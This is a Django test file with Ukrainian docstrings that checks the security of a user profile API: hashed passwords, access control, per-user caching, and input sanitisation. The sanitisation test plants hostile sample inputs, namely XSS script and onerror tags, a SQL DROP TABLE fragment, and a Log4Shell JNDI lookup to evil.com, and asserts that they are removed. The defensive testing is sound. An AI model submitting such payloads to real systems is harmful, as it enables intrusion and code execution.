import json

from django.contrib.auth import get_user_model
from django.test import TestCase, Client

User = get_user_model()


class DataSecurityTest(TestCase):
    """Тести безпеки даних"""

    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            email='data_sec@example.com',
            password='DataSec123!',
            is_verified_email=True,
            is_active=True
        )

    def test_sensitive_data_exposure(self):
        """Тест витоку чутливих даних"""
        self.client.force_login(self.user)

        response = self.client.get('/api/user/profile/')
        data = response.json()

        sensitive_fields = ['password', 'password_hash', 'session_key']

        for field in sensitive_fields:
            self.assertNotIn(field, str(data).lower())

        email = data.get('user', {}).get('email', '')
        self.assertIsNotNone(email)

    def test_data_encryption_at_rest(self):
        """Тест шифрування даних в БД"""
        sensitive_user = User.objects.create_user(
            email='sensitive@example.com',
            password='SensitivePass123!',
            is_verified_email=True,
            is_active=True
        )

        from django.db import connection
        with connection.cursor() as cursor:
            cursor.execute(
                "SELECT password FROM users_customuser WHERE email = %s",
                ('sensitive@example.com',),
            )
            result = cursor.fetchone()

            if result:
                stored_password = result[0]
                self.assertNotEqual(stored_password, 'SensitivePass123!')
                self.assertTrue(stored_password.startswith(('pbkdf2_', 'bcrypt', 'argon2')))

    def test_personal_data_access_control(self):
        """Тест контролю доступу до персональних даних"""
        user1 = User.objects.create_user(
            email='user1@example.com',
            password='User1Pass123!',
            is_verified_email=True,
            is_active=True
        )

        user2 = User.objects.create_user(
            email='user2@example.com',
            password='User2Pass123!',
            is_verified_email=True,
            is_active=True
        )

        self.client.force_login(user1)

        response = self.client.get(f'/api/user/{user2.id}/profile/')

        self.assertIn(response.status_code, [403, 404])

    def test_data_sanitization(self):
        """Тест санітизації даних"""
        self.client.force_login(self.user)

        dirty_data = {
            'user': {
                'name': '<script>alert("xss")</script>John',
                'surname': 'Vinsent DROP TABLE users; -- Smith'
            },
            'profile': {
                'bio': '${jndi:ldap://evil.com/attack}',
                'location': '<img src=x onerror=alert(1)>New York'
            }
        }

        response = self.client.patch(
            '/api/user/profile/',
            data=json.dumps(dirty_data),
            content_type='application/json'
        )

        self.assertEqual(response.status_code, 200)

        response = self.client.get('/api/user/profile/')
        clean_data = response.json()

        user_data = clean_data.get('user', {})
        profile_data = clean_data.get('profile', {})

        self.assertNotIn('<script>', user_data.get('name', '') or '')
        self.assertNotIn('DROP TABLE', user_data.get('surname', '') or '')
        self.assertNotIn('${jndi:', profile_data.get('bio', '') or '')
        self.assertNotIn('onerror', profile_data.get('location', '') or '')

    def test_cache_security(self):
        """Тест безпеки кешу"""
        self.client.force_login(self.user)

        response = self.client.get('/api/user/profile/')
        self.assertEqual(response.status_code, 200)

        other_user = User.objects.create_user(
            email='cache_attack@example.com',
            password='CacheAttack123!',
            is_verified_email=True,
            is_active=True
        )

        self.client.force_login(other_user)

        response = self.client.get('/api/user/profile/')
        data = response.json()

        self.assertEqual(data['user']['email'], 'cache_attack@example.com')
        self.assertNotEqual(data['user']['email'], 'data_sec@example.com')

    def test_log_security(self):
        """Тест безпеки логування"""
        response = self.client.post('/api/auth/login/', {
            'email': 'log_test@example.com',
            'password': 'WrongPassword123!'
        })

        self.assertIn(response.status_code, [400, 500])
